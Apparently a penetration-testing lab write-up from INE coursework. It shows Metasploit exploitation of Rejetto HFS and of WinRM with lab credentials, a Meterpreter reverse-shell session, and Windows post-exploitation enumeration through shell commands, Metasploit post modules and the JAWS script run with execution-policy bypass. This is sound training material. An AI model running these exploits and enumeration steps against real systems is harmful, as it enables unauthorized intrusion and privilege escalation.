# üî¨Windows Post-Exploitation

> üî¨ INE LAB
>
> * Target IP: `10.0.29.108`
> * **Local Windows Enumeration**

> üìùüìå **Always document and save all the Post-Exploitation Local Enumeration in a local file.**

## Enumeration & Exploitation <a href="#enumeration-and-exploitation" id="enumeration-and-exploitation"></a>

```bash
nmap -sV 10.0.29.108
```

```bash
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49175/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

```bash
searchsploit rejetto
service postgresql start && msfconsole -q
```

```bash
search rejetto
use exploit/windows/http/rejetto_hfs_exec
setg RHOSTS 10.0.29.108
run
	meterpreter >
```

## Local Enumeration <a href="#local-enumeration" id="local-enumeration"></a>

### System Information <a href="#system-information" id="system-information"></a>

* In the **`Meterpreter`** session

```bash
sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
```

```bash
getuid
    Server username: WIN-OMCNBKR66MN\Administrator
```

<pre class="language-bash"><code class="lang-bash"><strong>show_mount 
</strong>
    Mounts / Drives
    ===============
    
    Name  Type   Size (Total)  Size (Free)  Mapped to
    ----  ----   ------------  -----------  ---------
    C:\   fixed   29.66 GiB      8.49 GiB   
    
    
    Total mounts/drives: 1
</code></pre>

```bash
cat C:\\Windows\\System32\\eula.txt
# or
cd C:/
cd Windows 
cd System32
cat eula.txt
    [-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
```

```bash
shell
```

* In the **`Windows command prompt`** session

```bash
hostname
	WIN-OMCNBKR66MN
```

```bash
Host Name:                 WIN-OMCNBKR66MN
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00252-70000-00000-AA535
Original Install Date:     9/10/2020, 9:10:37 AM
System Boot Time:          8/7/2024, 9:22:36 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     1,024 MB
Available Physical Memory: 29 MB
Virtual Memory: Max Size:  9,216 MB
Virtual Memory: Available: 7,684 MB
Virtual Memory: In Use:    1,532 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WIN-OMCNBKR66MN
Hotfix(s):                 208 Hotfix(s) Installed.
                           [01]: KB2894856
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2919442
                           [05]: KB2934520
                           [06]: KB2938066
                           [07]: KB2938772
                           [08]: KB2949621
                           [09]: KB2954879
                           [10]: KB2955164
                           [11]: KB2959626
                           [12]: KB2965500
                           [13]: KB2967917
                           [14]: KB2969339
                           [15]: KB2971203
                           [16]: KB2973448
                           [..]
                           [206]: KB4566425
                           [207]: KB4569753
                           [208]: KB4571703
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.0.16.1
                                 IP address(es)
                                 [01]: 10.0.29.108
                                 [02]: fe80::d4d2:495e:2f04:395
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

* Get specific info about the KBs. pay attention to the **Security Updates**

```sh
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

```bash
Caption                                     Description      HotFixID   InstalledOn  
http://support.microsoft.com/?kbid=2894856  Security Update  KB2894856  10/15/2014   
http://support.microsoft.com/?kbid=2896496  Update           KB2896496  6/20/2014    
http://support.microsoft.com/?kbid=2919355  Update           KB2919355  3/18/2014    
http://support.microsoft.com/?kbid=2919442  Update           KB2919442  3/18/2014    
http://support.microsoft.com/?kbid=2934520  Update           KB2934520  1/13/2015    
http://support.microsoft.com/?kbid=2938066  Update           KB2938066  7/10/2014    
http://support.microsoft.com/?kbid=2938772  Update           KB2938772  3/18/2014    
http://support.microsoft.com/?kbid=2949621  Hotfix           KB2949621  3/18/2014   
```

{% hint style="info" %}
From the perspective of a penetration tester, we are able to use this information to identify whether the specific version of Windows running on the target is vulnerable to any exploits that can allow us to elevate our privileges or perform lateral movement.
{% endhint %}

### Users & Groups <a href="#users-and-groups" id="users-and-groups"></a>

```bash
getuid
    Server username: WIN-OMCNBKR66MN\Administrator
# "Administrator" user privileges
```

```bash
getprivs
    
    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeBackupPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeCreatePagefilePrivilege
    SeCreateSymbolicLinkPrivilege
    SeDebugPrivilege
    SeImpersonatePrivilege
    SeIncreaseBasePriorityPrivilege
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeLoadDriverPrivilege
    SeManageVolumePrivilege
    SeProfileSingleProcessPrivilege
    SeRemoteShutdownPrivilege
    SeRestorePrivilege
    SeSecurityPrivilege
    SeShutdownPrivilege
    SeSystemEnvironmentPrivilege
    SeSystemProfilePrivilege
    SeSystemtimePrivilege
    SeTakeOwnershipPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege
```

* Another important piece of information to enumerate is to check the list of currently logged on users.

```bash
background
search logged_on
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
This module reveals the currently logged on users and previous logged on users on the target system. This information will give you an idea as to whether there are other users currently using the target system and will also provide you with an idea of what other users have frequently logged on to the system.
{% endhint %}

* Back into the `Meterpreter` session

```bash
sessions 1
shell
```

* In the **`Windows command prompt`** session

```bash
whoami
	win-omcnbkr66mn\administrator
```

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State  
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
```

* Enumerate **current logged-on users**

```shell-session
quety user
```

```bash
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         console             1  Active      none   8/7/2024 9:22 AM
```

* Display all the accounts

```bash
net users
```

```bash
User accounts for \\WIN-OMCNBKR66MN

-------------------------------------------------------------------------------
Administrator            Guest                    
The command completed successfully.
#t he target system only has the Administrator
```

* Detailed overview of the configuration of `Administrator` user account like when the account password was changed or when it expires.

```bash
net user <USER_NAME>
net user Administrator
```

```bash
User accounts for \\WIN-OMCNBKR66MN

-------------------------------------------------------------------------------
Administrator            Guest                    
The command completed successfully.


C:\Windows\System32>net user Administrator     
net user Administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/10/2020 9:10:03 AM
Password expires             Never
Password changeable          9/10/2020 9:10:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   8/7/2024 9:22:55 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

* Enumerate **groups**

```bash
net lcoalgroup
```

```bash
Aliases for \\WIN-OMCNBKR66MN

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Users
*WinRMRemoteWMIUsers__
The command completed successfully.
```

* View the members of a particular group

```bash
net localgroup administrators
```

```bash
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```

### Network Information <a href="#network-information" id="network-information"></a>

* Show **network adapter** info
  * command reveals that there is only one physical interface connected to the target and reveals the IP address associated with the network interface as well as the default gateway and subnet mask.

```bash
ipconfig
```

```bash
Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::d4d2:495e:2f04:395%12
   IPv4 Address. . . . . . . . . . . : 10.0.29.108
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.0.16.1

Tunnel adapter isatap.ap-southeast-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
```

* **`ipconfig /all`** command reveals more information like the **MAC** address of the target system.

```bash
ipconfig /all
```

```bash
Windows IP Configuration

   Host Name . . . . . . . . . . . . : WIN-OMCNBKR66MN
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : ap-southeast-1.ec2-utilities.amazonaws.com
                                       us-east-1.ec2-utilities.amazonaws.com
                                       ap-southeast-1.compute.internal

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 06-E8-8E-A1-98-AB
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::d4d2:495e:2f04:395%12(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.0.29.108(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Lease Obtained. . . . . . . . . . : Wednesday, August 7, 2024 9:22:46 AM
   Lease Expires . . . . . . . . . . : Wednesday, August 7, 2024 10:52:46 AM
   Default Gateway . . . . . . . . . : 10.0.16.1
   DHCP Server . . . . . . . . . . . : 10.0.16.1
   DHCPv6 IAID . . . . . . . . . . . : 319697556
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-EB-A5-6A-06-4E-FA-4C-65-EA
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.ap-southeast-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   
# Pay attention to the internal networks and to the DNS & DHCP server
```

* Display the **routing table**
  * This command will display a list of both IPV4 and IPV6 routes.
  * This information is very useful during the pivoting phase of post-exploitation as it can reveal network routes.

```bash
route print
```

```bash
===========================================================================
Interface List
 12...06 e8 8e a1 98 ab ......AWS PV Network Device #0
  1...........................Software Loopback Interface 1
 14...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0        10.0.16.1      10.0.29.108     10
        10.0.16.0    255.255.240.0         On-link       10.0.29.108    266
      10.0.29.108  255.255.255.255         On-link       10.0.29.108    266
      10.0.31.255  255.255.255.255         On-link       10.0.29.108    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  169.254.169.123  255.255.255.255        10.0.16.1      10.0.29.108     10
  169.254.169.249  255.255.255.255        10.0.16.1      10.0.29.108     10
  169.254.169.250  255.255.255.255        10.0.16.1      10.0.29.108     10
  169.254.169.251  255.255.255.255        10.0.16.1      10.0.29.108     10
  169.254.169.253  255.255.255.255        10.0.16.1      10.0.29.108     10
  169.254.169.254  255.255.255.255        10.0.16.1      10.0.29.108     10
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link       10.0.29.108    266
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  255.255.255.255  255.255.255.255         On-link       10.0.29.108    266
===========================================================================
Persistent Routes:
  None

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    306 ::1/128                  On-link
 12    266 fe80::/64                On-link
 12    266 fe80::d4d2:495e:2f04:395/128
                                    On-link
  1    306 ff00::/8                 On-link
 12    266 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

* Check the `arp` table for a list of all devices on the network

```bash
arp -a
```

```bash
Interface: 10.0.29.108 --- 0xc
  Internet Address      Physical Address      Type
  10.0.16.1             06-73-41-c8-ca-42     dynamic   
  10.0.24.47            06-6d-76-fa-cd-9e     dynamic   
  10.0.24.176           06-20-14-ab-88-8c     dynamic   
  10.0.31.103           06-4d-7a-33-38-c2     dynamic   
  10.0.31.255           ff-ff-ff-ff-ff-ff     static    
  169.254.169.254       06-73-41-c8-ca-42     dynamic   
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static 
```

* List open listening connections/ports

```bash
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2100 # HTTP
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       748  # NetBIOS
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4    # SMB
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1840 # RDP
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       564
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       844
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       892
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1040
  TCP    0.0.0.0:49164          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49175          0.0.0.0:0              LISTENING       664
  TCP    10.0.29.108:139        0.0.0.0:0              LISTENING       4
  TCP    10.0.29.108:49318      10.10.21.9:4444        ESTABLISHED     2928
  TCP    10.0.29.108:49352      10.10.21.9:4444        ESTABLISHED     2368 # Meterpreter Session
  TCP    10.0.29.108:49582      10.0.31.103:443        ESTABLISHED     1064
  TCP    10.0.29.108:50037      169.254.169.254:80     CLOSE_WAIT      1252
  TCP    10.0.29.108:50048      10.0.24.47:443         ESTABLISHED     1064
  TCP    127.0.0.1:80           127.0.0.1:50051        ESTABLISHED     2100
  TCP    127.0.0.1:50051        127.0.0.1:80           ESTABLISHED     2732
  TCP    [::]:135               [::]:0                 LISTENING       748
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       1840
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       564
  TCP    [::]:49153             [::]:0                 LISTENING       844
  TCP    [::]:49154             [::]:0                 LISTENING       892
  TCP    [::]:49155             [::]:0                 LISTENING       1040
  TCP    [::]:49164             [::]:0                 LISTENING       656
  TCP    [::]:49175             [::]:0                 LISTENING       664
  UDP    0.0.0.0:500            *:*                                    892
  UDP    0.0.0.0:3389           *:*                                    1840
  UDP    0.0.0.0:4500           *:*                                    892
  UDP    0.0.0.0:5355           *:*                                    1008
  UDP    10.0.29.108:137        *:*                                    4
  UDP    10.0.29.108:138        *:*                                    4
  UDP    [::]:500               *:*                                    892
  UDP    [::]:3389              *:*                                    1840
  UDP    [::]:4500              *:*                                    892
  UDP    [::]:5355              *:*                                    1008

```

* **Win Firewall** state

```bash
netsh firewall show state

        IMPORTANT: "netsh firewall" is deprecated;
    use "netsh advfirewall firewall" instead.
    For more information on using "netsh advfirewall firewall" commands
    instead of "netsh firewall", see KB article 947709
    at http://go.microsoft.com/fwlink/?linkid=121488 .
    
    The RPC server is unavailable.
    
# Win Firewall is disabled
```

### Processes & Services <a href="#processes-and-services" id="processes-and-services"></a>

> Target IP: `10.0.27.133`

* Enumerate all **running processes**, from a `Meterpreter` session

```bash
ps
```

```bash
Process List
============

 PID   PPID  Name                  Arch  Session  User                           Path
 ---   ----  ----                  ----  -------  ----                           ----
 0     0     [System Process]                                                    
 4     0     System                x64   0                                       
 348   4     smss.exe              x64   0                                       
 492   484   csrss.exe             x64   0                                       
 556   548   csrss.exe             x64   1                                       
 564   484   wininit.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wininit.exe
 592   548   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM            C:\Windows\System32\winlogon.exe
 656   564   services.exe          x64   0                                       
 664   564   lsass.exe             x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\lsass.exe
 720   656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
[...]

# "User" collumn is important
```

* **Process migration** is recommended to obtain a stable `Meterpreter session`
  * utilize **meterpreter** to search for specific processes

```bash
pgrep explorer.exe

migrate <PROCESS_ID>
```

<figure><img src="../../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

* In the **`Windows command prompt`** session
* List **started services**

```bash
shell
net start
```

```bash
These Windows services are started:
   Amazon SSM Agent
   AWS Lite Guest Agent
   Background Tasks Infrastructure Service
   Base Filtering Engine
   Certificate Propagation
   CNG Key Isolation
   COM+ Event System
   Cryptographic Services
   DCOM Server Process Launcher
   Device Install Service
   Device Setup Manager
   [...]
```

```bash
wmic service list brief
```

```bash
ExitCode Name                 ProcessId  StartMode  State    Status  
0        AeLookupSvc          0          Manual     Stopped  OK
1077     ALG                  0          Manual     Stopped  OK
0        AmazonSSMAgent       1084       Auto       Running  OK
1077     AppIDSvc             0          Manual     Stopped  OK
1077     Appinfo              0          Manual     Stopped  OK
1077     AppMgmt              0          Manual     Stopped  OK
1077     AppReadiness         0          Manual     Stopped  OK
1077     AppXSvc              0          Manual     Stopped  OK
1077     AudioEndpointBuilder 0          Manual     Stopped  OK
1077     Audiosrv             0          Manual     Stopped  OK
0        AWSLiteAgent         1144       Auto       Running  OK
0        BFE                  896        Auto       Running  OK
1077     BITS                 0          Manual     Stopped  OK
0        BrokerInfrastructure 720        Auto       Running  OK
1077     Browser              0          Disabled   Stopped  OK
0        CertPropSvc          904        Manual     Running  OK
```

* List the **running tasks and the corresponding services**

```bash
tasklist /svc
```

```bash
Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
smss.exe                       348 N/A                                         
csrss.exe                      492 N/A                                         
csrss.exe                      556 N/A                                         
wininit.exe                    564 N/A                                         
winlogon.exe                   592 N/A                                         
services.exe                   656 N/A                                         
lsass.exe                      664 KeyIso, SamSs                               
svchost.exe                    720 BrokerInfrastructure, DcomLaunch,           
                                   DeviceInstall, LSM, PlugPlay, Power,        
                                   SystemEventsBroker                          
svchost.exe                    748 RpcEptMapper, RpcSs                         
dwm.exe                        848 N/A                                         
svchost.exe                    856 Dhcp, EventLog, lmhosts, Wcmsvc             
svchost.exe                    892 AeLookupSvc, CertPropSvc, DsmSvc, gpsvc,    
                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    
                                   Schedule, SENS, SessionEnv,                 
                                   ShellHWDetection, Themes, Winmgmt           
svchost.exe                    932 EventSystem, FontCache, netprofm, nsi,      
                                   W32Time, WinHttpAutoProxySvc                
svchost.exe                   1016 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc, WinRM                               
svchost.exe                    772 BFE, DPS                                    
spoolsv.exe                   1044 Spooler                                     
amazon-ssm-agent.exe          1068 AmazonSSMAgent 
[...]
```

* List the **scheduled tasks**

> üìå Scheduled tasks can be misconfigured and vulnerable to **exploitation** and **privilege escalation**!

```bash
schtasks /query /fo LIST
```

```bash
[...]

Folder: \Microsoft\Windows\Workplace Join
HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\Workplace Join\Automatic-Workplace-Join
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\WS
HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\WS\License Validation
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\WS\WSTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Mozilla
HostName:      WIN-OMCNBKR66MN
TaskName:      \Mozilla\Firefox Default Browser Agent E7CF176E110C211B
Next Run Time: 8/8/2024 9:05:00 AM
Status:        Ready
Logon Mode:    Interactive only
```

```bash
schtasks /query /fo LIST /v
```

```bash
[...]

Folder: \Mozilla
HostName:                             WIN-OMCNBKR66MN
TaskName:                             \Mozilla\Firefox Default Browser Agent E7CF176E110C211B
Next Run Time:                        8/8/2024 9:05:00 AM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        8/7/2024 12:23:13 PM
Last Result:                          0
Author:                               Mozilla
Task To Run:                          C:\Program Files (x86)\Mozilla Firefox\default-browser-agent.exe do-task "E7CF176E110C211B"
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          WIN-7QR6LSQGQ0I\Administrator
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:35:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Daily 
Start Time:                           9:05:00 AM
Start Date:                           9/5/2020
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

```

## Automating Local Enum <a href="#automating-local-enum" id="automating-local-enum"></a>

> üî¨ INE LAB
>
> * Target IP: `10.0.17.176`
> * Credentials: `administrator`:`tinkerbell`
> * Automation Tools:
>   * [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
>   * Metasploit Framework

**`JAWS`** - PowerShell 2.0 script designed to help penetration testers quickly _identify potential privilege escalation vectors on Windows systems._

```bash
PS C:\temp> .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
```

### Enumeration & Exploitation <a href="#enumeration-and-exploitation-1" id="enumeration-and-exploitation-1"></a>

```bash
# Target WinRM
nmap -sV -p 5985 10.0.17.176
	5985/tcp open  http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

```bash
service postgresql start && msfconsole -q
search winrm
use exploit/windows/winrm/winrm_script_exec
setg RHOSTS 10.0.17.176
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
run
```

<figure><img src="../../../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

### Metasploit Post-Exploitation <a href="#metasploit-post-exploitation" id="metasploit-post-exploitation"></a>

```bash
background
```

* Enumerate **current user privileges**

```bash
use post/windows/gather/win_privs
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

* Enumerate **logged on users**

```bash
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

* Check if the target is a **VM or a container**

```bash
use post/windows/gather/checkvm
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

* Enumerate **installed applications**
  * Search for vulnerabilities in the installed programs

```bash
use post/windows/gather/enum_applications
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

* Enumerate same **LAN computers**

```bash
use post/windows/gather/enum_computers
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

* Enumerate **installed updates/patches**

```bash
use post/windows/gather/enum_patches
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

* Enumerate the **SMB shares**

```bash
use post/windows/gather/enum_shares
set SESSION 1
run
```

<figure><img src="../../../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

### JAWS <a href="#jaws" id="jaws"></a>

* Copy the content of the [jaws-enum.ps1](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1) script and save it in the lab environment

<figure><img src="../../../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

* Back into the `MSFconsole` session, copy the **`jaws-enum.ps1`** file into the `C:\temp` target directory

```bash
session 1
cd C:\\
mkdir Temp
cd Temp
upload /root/Desktop/jaws-enum.ps1
shell
```

<figure><img src="../../../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

* Run **`jaws-enum.ps1`** and output the results in a file

```sh
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
```

<figure><img src="../../../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

```bash
# Back into the Meterpreter session
download Jaws-Enum.txt
```

* Open the `Jaws-Enum.txt` file.

<figure><img src="../../../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>
